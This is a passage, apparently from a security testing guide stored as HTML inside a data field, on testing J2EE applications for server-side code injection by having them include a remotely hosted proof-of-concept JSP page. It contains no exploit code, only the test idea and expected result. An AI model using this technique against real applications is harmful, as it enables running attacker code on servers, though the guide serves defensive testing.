code.</li>\r\n  </ol>\r\n  <p>Expected results: The application is vulnerable if it includes and executes the JSP page and displays the message <i>Application is vulnerable.</i></p>\r\n  <h1>Conclusions</h1>\r\n  <p>Server-side code injection bugs allow attackers to inject code that will be executed by the J2EE engine that hosts the vulnerable application. Attackers can use server-side code injection to execute logical attacks on the target application. To learn how to test for this vulnerability, it is necessary to understand its attack scenario and how it is possible in J2EE applications, as well as how to protect against it. Testing for this bug requires building a small proof-of-concept page, hosting it in a remote location, and passing a URL to the page as input to the application under test while observing how the application reacts.</p>"
}